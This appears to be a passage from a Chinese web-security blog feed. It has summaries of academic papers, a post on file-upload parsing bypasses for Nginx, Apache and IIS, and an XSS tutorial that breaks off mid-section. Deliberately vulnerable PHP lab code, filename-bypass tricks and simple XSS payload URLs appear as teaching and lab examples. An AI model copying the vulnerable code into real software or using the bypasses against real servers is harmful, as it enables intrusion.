Templates"></a>HTTP Request Templates</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547692490082.png" alt="1547692490082"></p><h2 id="Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17"><a href="#Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17" class="headerlink" title="Measuring the Insecurity of Mobile Deep Links of Android, usenix17"></a>Measuring the Insecurity of Mobile Deep Links of Android, usenix17</h2><p>Deep Link是指应用内特殊的URI，它有助于网络到应用的通信，Android推出了两种新方法”App links”和“Intent URLs”用来替换scheme URL，但是没有多少时间，本文调查了2014-2016年google市场的APP，发现新的连接方式并没有带来安全性改善，只有2.2%的应用正确使用了新方法，另外，我们发现了一种新的风险，最后，我们发现了更多的URL劫持的案例。</p><h2 id="AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17"><a href="#AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17" class="headerlink" title="AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*"></a>AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*</h2><p>本文设计AuthScope工具，该工具能够自动执行移动应用程序，并在相应的在线服务中识别出易受攻击的访问控制实现。</p><h2 id="Effective-Real-Time-Android-Application-Auditing-S-amp-P14"><a href="#Effective-Real-Time-Android-Application-Auditing-S-amp-P14" class="headerlink" title="Effective Real-Time Android Application Auditing, S&amp;P14"></a>Effective Real-Time Android Application Auditing, S&amp;P14</h2><p>本文设计了一套动态审计工具来检查应用是否存在<strong>数据泄露</strong>问题，降低静态检测的误报率。</p><h1 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h1><p>js存在的安全问题包含了XSS，因此这里排除了XSS。</p><h2 id="CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19"><a href="#CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19" class="headerlink" title="CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19"></a>CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19</h2><p>本文设计了一套js代码生成工具，它可以生成语义和语法上都正确的JavaScript片段，因此可以<strong>用于fuzz来发现JavaScript引擎的漏洞</strong>。具体来说，该工具将种子分解为代码片段，每一个片段用一段约束来标记，这些约束表示它与其他代码块在一起的条件。</p><h2 id="SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18"><a href="#SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18" class="headerlink" title="SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18"></a>SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18</h2><p>本文发现Nodejs的很多模块存在命令注入攻击的问题，因此本文提出了Synode，一种结合静态分析和动态的方法，使开发者安全的使用这些有问题的库。具体来说，Synode静态分析哪些值会传播到API中，并且在安装时修复；动态运行时，它截恶意请求防止他们传递到api中。</p><h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><ul><li>X. Jin, X. Hu, K. Ying, W. Du, H. Yin, and G. N. Peri. Code injection attacks on HTML5-based mobile apps: Characterization, detection and mitigation. In Conference on Computer and Communications Security, pages 66–77, 2014</li><li>P. Saxena, D. Molnar, and B. Livshits. SCRIPTGARD: automatic context-sensitive sanitization for large-scale legacy web applications. In CCS, pages 601–614, 2011. </li><li>M. Ter Louw and V. N. Venkatakrishnan. Blueprint: Robust prevention of cross-site scripting attacks for existing browsers. In Sec. and Privacy, pages 331–346, 2009. </li><li>S. Guarnieri and B. Livshits. GATEKEEPER: mostly static enforcement of security and reliability policies for JavaScript code. In USENIX Security, pages 151–168, 2009. </li></ul><h2 id="Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17"><a href="#Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17" class="headerlink" title="Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17"></a>Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17</h2><p>本文对Alexa有排行的网站镜像进行了调查，发现web开发者会应用很多第三方库（比如jQuery），这些库的旧版本存在漏洞。</p><h2 id="The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15"><a href="#The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15" class="headerlink" title="The Unexpected Dangers of Dynamic JavaScript (survey), usenix15"></a>The Unexpected Dangers of Dynamic JavaScript (survey), usenix15</h2><p>JS存在XSS等安全性问题，为此本文进行了实证研究了它的影响，并且提出了安全防护方法。</p><h2 id="ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15"><a href="#ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15" class="headerlink" title="ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15"></a>ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15</h2><p>现代网站大量依赖JS，这些JS的客户端验证（client-side validation,CSV）存在脆弱性（实际上是逻辑问题），本文提出了一个检测该类问题的系统ZigZag，它是一个代理，透明的检测用户端代码，并且实时的获取执行状态，从中产生控制流和数据，以此识别与攻击相关的操作。</p><h2 id="Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14"><a href="#Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14" class="headerlink" title="Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14"></a>Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14</h2><p>本文开发了工具JsRED，一种用于自动检测<strong>重定向脚本注入</strong>的新技术，它通过比较当前的JS-lib版本和正常的版本差异判断脚本是否被替换。</p><h1 id="Access-control"><a href="#Access-control" class="headerlink" title="Access control"></a>Access control</h1><h2 id="FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15"><a href="#FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15" class="headerlink" title="FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15"></a>FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15</h2><p>web应用会出现水平越权的问题，由于很多网站的用户访问控制模型类似，因此我们可以布置一个外部代理（nginx端），然后观察用户的所有流量，然后根据预期的访问控制策略规范来侦测未经授权的访问。</p><h2 id="MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14"><a href="#MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14" class="headerlink" title="MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14"></a>MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14</h2><p>我们实现了工具MACE，通过访问资源时的上下文不一致性来识别水平特权升级漏洞</p><h2 id="Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14"><a href="#Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14" class="headerlink" title="Automating Isolation and Least Privilege in Web Services, S&amp;P14"></a>Automating Isolation and Least Privilege in Web Services, S&amp;P14</h2><p>本文设计了一个防止数据未授权读写的系统Passe，它动态地从开发者提供的测试用例分析数据流和控制流，将应用分离成几个模块，并且将模块放入沙盒中运行。另外，我们将Passe嵌入了Django框架中，我们发现它可以正确地分析96%的策略，同时还可以防御XSS攻击。</p><h1 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h1><p>能分类的survey已经分到具体的类型中，这里列出与web相关的其他调查。</p><h2 id="Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17"><a href="#Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17" class="headerlink" title="Same-Origin Policy: Evaluation in Modern Browsers, usenix17"></a>Same-Origin Policy: Evaluation in Modern Browsers, usenix17</h2><p>SOP-DOM是同源策略的自己，它控制主文档和嵌入文档之间的交互，但是没有正式的规范，本文通过实证研究，发现除了Web Origins之外，SOP-DOM授予的访问权限至少取决于三个属性：嵌入元素（EE）的类型，沙箱（浏览器）和CORS属性。</p><h2 id="How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17"><a href="#How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17" class="headerlink" title="How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17"></a>How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17</h2><p>本文检查了97-16年的重要网站代码和头信息，以此确定web技术的关键趋势，随后评估与之关联的漏洞，在调查解决他们的安全防御机制。本文发现自2000年以来，JavaScript开始流行，客户端注入的可能性增加，但CSP的部署却没有跟上，另外使用HTTP only cookie的网站更容易遭受XSS。</p><h1 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h1><h2 id="k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16"><a href="#k-fingerprinting-A-Robust-Scalable-Website-Fingerprinting-Technique-fingerprint-usenix16" class="headerlink" title="k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16"></a>k-fingerprinting: A Robust Scalable Website Fingerprinting Technique(fingerprint), usenix16</h2><p>攻击者可以在tor网络中实施被动攻击比如，指纹识别，本文提出了基于随机森林的网站指纹识别技术，它能抵抗tor和先进的网站指纹识别防御技术。</p><h2 id="Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16"><a href="#Cloak-of-Visibility-Detecting-When-Machines-Browse-a-Different-Web-fingerprint-S-amp-P16" class="headerlink" title="Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16"></a>Cloak of Visibility: Detecting When Machines Browse a Different Web(fingerprint), S&amp;P16</h2><p>恶意网站会使用复杂技术隐藏自身，防止被搜索引擎发现其本质。我们调查了暗网的十大著名技术，并且开发了一种反隐身系统。</p><h2 id="JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19"><a href="#JavaScript-Template-Attacks-Automatically-Inferring-Host-Information-for-Targeted-Exploits-fingerprint-ndss19" class="headerlink" title="JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19"></a>JavaScript Template Attacks: Automatically Inferring Host Information for Targeted Exploits(fingerprint), ndss19</h2><p>如今的浏览器会提供匿名功能隐藏信息，而本文提出了一种自动化推断系统信息（包括软件和硬件）的方法，该方法通过JavaScript引擎收集各种数据，再根据这些属性创建模板，如果这个模板的某一属性在各个系统上都不相同则它是一个依赖于环境的属性。</p><h1 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h1><h2 id="On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16"><a href="#On-Omitting-Commits-and-Committing-Omissions-Preventing-Git-Metadata-Tampering-That-Re-introduces-Software-Vulnerabilities-git-usenix16" class="headerlink" title="On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16"></a>On Omitting Commits and Committing Omissions: Preventing Git Metadata Tampering That (Re)introduces Software Vulnerabilities (git), usenix16</h2><p>元数据攻击指针对版本控制系统的攻击方法，它欺骗开发者执行意外操作，比如将未经测试的代码合并到生产分支中，或是包含一致漏洞的组件。本文提出了一种防御方案，通过维护开发人员的加密签名后的日志环节这些攻击。</p><h2 id="Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14"><a href="#Automatically-Detecting-Vulnerable-Websites-Before-They-Turn-Malicious-mechine-learning-usenix14" class="headerlink" title="Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14"></a>Automatically Detecting Vulnerable Websites Before They Turn Malicious (mechine learning), usenix14</h2><p>本文使用数据挖掘和机器学习的几种技术，来预测一个给定的、未被侵入的网站是否会变得有问题。</p><h2 id="Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17"><a href="#Static-detection-of-asymptotic-resource-side-channel-vulnerabilities-in-web-applications-side-channel-ase17" class="headerlink" title="Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17"></a>Static detection of asymptotic resource side-channel vulnerabilities in web applications (side channel), ase17</h2><p>本文开发了一个SCANNER的工具，用于检测PHP应用程序中与资源相关的侧信道泄露漏洞——例如一个关于健康的网站，泄露了病人吃药的时间。</p><h2 id="Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18"><a href="#Predicting-Impending-Exposure-to-Malicious-Content-from-User-Behavior-defense-ccs18" class="headerlink" title="Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18"></a>Predicting Impending Exposure to Malicious Content from User Behavior(defense), ccs18</h2><p>本文提出了一种系统，可以再单个浏览会话级别上观察用户行为，从而预测他们是否是攻击型为，已达到提前预防的目的。</p><h2 id="Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17"><a href="#Deemon-Detecting-CSRF-with-Dynamic-Analysis-and-Property-Graphs-CSRF-ccs17" class="headerlink" title="Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17"></a>Deemon: Detecting CSRF with Dynamic Analysis and Property Graphs (CSRF), ccs17</h2><p>本文提出检测CSRF的框架，该框架考虑了web应用的执行流程，数据流以及整体架构，构建一个属性图，然后使用图遍历，发觉潜在的CSRF问题。Deemon自动判断web应用的执行环境，接着无监督的产生动态记录，比如网络交互，服务端执行和数据库操作，使用这些记录Deemon构建一个图模型，他表示捕获的状态转换和数据流；接着遍历这个图来发觉http状态变换，这些变换与CSRF流动现骨干。</p><h2 id="Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16"><a href="#Attack-Patterns-for-Black-Box-Security-Testing-of-Multi-Party-Web-Applications-SSO-ndss16" class="headerlink" title="Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*"></a>Attack Patterns for Black-Box Security Testing of Multi-Party Web Applications(SSO), ndss16*</h2><p>我们针对单点登陆(SSO)存在的问题，设计了两种攻击模式CSRF和XSS，并且基于ZAP设计了扫描器，经过实验我们发先它能发现知名网站的安全性问题。</p><h2 id="Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14"><a href="#Toward-Black-Box-Detection-of-Logic-Flaws-in-Web-Applications-Logic-Flaws-ndss14" class="headerlink" title="Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14"></a>Toward Black-Box Detection of Logic Flaws in Web Applications (Logic Flaws), ndss14</h2><p>由于缺失文档，判断逻辑漏洞十分困难，现有的工具需要调查源代码或是只适用于小规模应用，而我们利用用户产生的流量产生一个行为序列，接着重用这个序列判断网站是否存在问题。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全-学术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>容器上传绕过总结</title>
      <link href="/%E7%BB%84%E4%BB%B6-%E5%AE%B9%E5%99%A8%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/%E7%BB%84%E4%BB%B6-%E5%AE%B9%E5%99%A8%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建漏洞服务"><a href="#搭建漏洞服务" class="headerlink" title="搭建漏洞服务"></a>搭建漏洞服务</h1><p>还是先搭一个漏洞的服务吧：新建一个~/Desktop/php/upload文件夹，文件夹下存在如下结构的文件和文件夹：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── files</span><br><span class="line">└── upload.php</span><br><span class="line"></span><br><span class="line">1 directory, 1 file</span><br></pre></td></tr></table></figure><p>upload.php:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;</span><br><span class="line">enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;</span><br><span class="line">    echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    // 判断当期目录下的 upload 目录是否存在该文件</span><br><span class="line">    // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span><br><span class="line">    if (file_exists(&quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;PWD: &quot; . `pwd` . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;;</span><br><span class="line">        // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br><span class="line">        $file_path = &quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $success = move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $file_path);</span><br><span class="line">        echo &quot;Stored in: &quot; .$file_path.&quot;&lt;br/&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        if(file_exists($file_path))&#123;</span><br><span class="line">            $str = file_get_contents($file_path);//将整个文件内容读入到一个字符串中</span><br><span class="line">            $str = str_replace(&quot;\r\n&quot;,&quot;&lt;br /&gt;&quot;,$str);</span><br><span class="line">            $str = htmlspecialchars($str);</span><br><span class="line">            echo &quot;File Contents: $str&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>1.php%001.jpg</code>，Nginx在<code>%00</code>截断，例如：</p><p>用%00截断过狗：</p><p><img src="/组件-容器上传绕过总结/1544361917866.png" alt="1544361917866"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>设置上传目录不被php解析：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> test.com;</span><br><span class="line">    <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">index</span> test.php;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \/upload\/files\/.*</span> &#123;</span><br><span class="line">        <span class="attribute">root</span> /home/repersp/Desktop/php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># With php7.0-cgi alone:</span></span><br><span class="line">        <span class="comment"># fastcgi_pass 127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment"># With php7.0-fpm:</span></span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件名后缀黑名单：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="2-4-0以前"><a href="#2-4-0以前" class="headerlink" title="2.4.0以前"></a>2.4.0以前</h2><p><code>1.php.xxx</code>Apache从后往前解析，直到能解析。</p><h2 id="2-4-0-2-4-29"><a href="#2-4-0-2-4-29" class="headerlink" title="2.4.0-2.4.29"></a>2.4.0-2.4.29</h2><p><code>1.php%0A</code>因为代码中不能用<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>获取文件名，所以利用条件苛刻。</p><h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="6-0"><a href="#6-0" class="headerlink" title="6.0"></a>6.0</h2><ul><li><code>/xx.asp;.jpg</code> IIS不解析<code>;</code>后面的内容</li><li><code>/1.asp/1.jpg</code> IIS将<code>.asp</code>文件夹下的所有文件解析</li></ul><h2 id="7-5"><a href="#7-5" class="headerlink" title="7.5"></a>7.5</h2><p><code>php.jpg/.php</code> 要开启<code>cgi.fix_pathinfo=1</code></p>]]></content>
      
      
      <categories>
          
          <category> Web安全-组件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> apache </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS类型、利用和防御</title>
      <link href="/xss-XSS%E7%B1%BB%E5%9E%8B%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
      <url>/xss-XSS%E7%B1%BB%E5%9E%8B%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>用户访问带有XSS代码的请求，服务器立即将代码发送至浏览器，浏览器执行恶意代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1/reflect.php?xss=&lt;script&gt;alert(1);&lt;/script&gt;</span></span><br><span class="line">setcookie(<span class="string">'session'</span>, <span class="string">'qwerty'</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/xss-XSS类型、利用和防御/1550126906314.png" alt="1550126906314"></p><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>XSS代码被保存（至数据库），待页面被访问时再执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span class="string">'action'</span>];</span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$password=$_GET[<span class="string">'password'</span>];</span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"><span class="keyword">if</span>($action==<span class="string">'get'</span>)&#123;</span><br><span class="line">    $sql=<span class="string">"select * from test where username='$name'"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">            print_r($row);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $sql=<span class="string">"insert into test values ('$name', '$password')"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        print_r($result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先插入一个存在问题的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=insert&amp;name=anemone&amp;password=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550129399199.png" alt="1550129399199"></p><p>接着访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=get&amp;name=anemone</span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550129511724.png" alt="1550129511724"></p><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>通过js操控dom引入xss代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// 